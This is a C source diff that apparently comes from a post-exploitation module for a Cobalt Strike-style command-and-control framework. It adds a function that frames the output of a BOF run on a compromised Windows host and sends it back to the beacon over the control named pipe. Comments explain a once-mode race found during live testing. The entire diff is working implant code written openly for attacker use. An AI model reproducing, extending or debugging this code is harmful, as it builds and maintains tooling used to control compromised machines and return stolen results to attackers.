@@ -132,6 +132,43 @@ static void shim_printf(int type, const char * fmt, ...) {
 }
 
 /* deliver buffered output through a fresh pipe server in kit chunks */
+/* once-mode flush: kit chunks straight down the CONTROL pipe (already
+ * connected by the beacon's job register). FlushFileBuffers is the
+ * consumption barrier: it blocks until the client (beacon) has read
+ * everything, so nothing is lost when the process exits right after. */
+static BOOL flush_output_ctrl(HANDLE ctrl) {
+	DWORD mode = PIPE_READMODE_BYTE;
+	POSTEX_ARGUMENTS * pa = (POSTEX_ARGUMENTS *)gPostexArgumentsBuffer;
+	int chunkMax = pa->maxPacketSize > 256 ? pa->maxPacketSize - 64 : 1024 * 1024 - 64;
+	int off = 0;
+	unsigned short cid = 0;
+
+	if (ctrl == INVALID_HANDLE_VALUE || g_outLen <= 0)
+		return FALSE;
+	if (chunkMax < 256) chunkMax = 256;
+	SetNamedPipeHandleState(ctrl, &mode, NULL, NULL);
+	do {
+		int payload = g_outLen - off;
+		char hdr[12];
+		int lenBE, flagsBE, typeBE;
+		unsigned char * p;
+		if (payload > chunkMax) payload = chunkMax;
+		lenBE = 4 + payload;
+		flagsBE = (int)(cid | ((off + payload) >= g_outLen ? 1 << 16 : 0));
+		typeBE = 0; /* CALLBACK_OUTPUT */
+		p = (unsigned char *)hdr;
+		p[0] = (unsigned char)(lenBE >> 24); p[1] = (unsigned char)(lenBE >> 16); p[2] = (unsigned char)(lenBE >> 8); p[3] = (unsigned char)lenBE;
+		p[4] = (unsigned char)(flagsBE >> 24); p[5] = (unsigned char)(flagsBE >> 16); p[6] = (unsigned char)(flagsBE >> 8); p[7] = (unsigned char)flagsBE;
+		p[8] = (unsigned char)(typeBE >> 24); p[9] = (unsigned char)(typeBE >> 16); p[10] = (unsigned char)(typeBE >> 8); p[11] = (unsigned char)typeBE;
+		if (!WriteFile(ctrl, hdr, 12, NULL, NULL)) return FALSE;
+		if (payload > 0 && !WriteFile(ctrl, g_out + off, payload, NULL, NULL)) return FALSE;
+		off += payload;
+		cid++;
+	} while (off < g_outLen);
+	FlushFileBuffers(ctrl);
+	return TRUE;
+}
+
 static BOOL flush_output_pipe(const char * pipeName) {
 	HANDLE h;
 	DWORD mode = PIPE_READMODE_BYTE;
@@ -498,9 +535,22 @@ static void run_async(LPVOID raw) {
 		eclog("st: run_bof enter\n");
 		run_bof(bof, bl);
 		eclog("st: run_bof returned\n");
-		eclog("st: flush_output enter\n");
-		flush_output_pipe(pn);
-		eclog("st: flush_output returned\n");
+		if (runOnce) {
+			/* kit once-mode parity (2026-11-12 live forensics): the beacon's
+			 * CONTROL-pipe register (ExecuteDllJob 101, wait=15000) runs
+			 * BEFORE the cna's output-pipe register at the same checkin -
+			 * its pipe_try blocks the queue 15s and the output register
+			 * lands past flush_output_pipe's own 15s client-wait window
+			 * (pipe gone, "Could not connect to pipe: 2"). The control pipe
+			 * is already tracked by the register that gates run_async, so
+			 * flush the chunks THERE: pipe_try sees data, psh_poll drains
+			 * them, no second connection race. FlushFileBuffers blocks
+			 * until the beacon has consumed the bytes - closing early would
+			 * discard the pipe buffer (C-21 factor 3). */
+			flush_output_ctrl(g_ctrl);
+		} else {
+			flush_output_pipe(pn);
+		}
 		HeapFree(GetProcessHeap(), 0, pn);
 	}
 
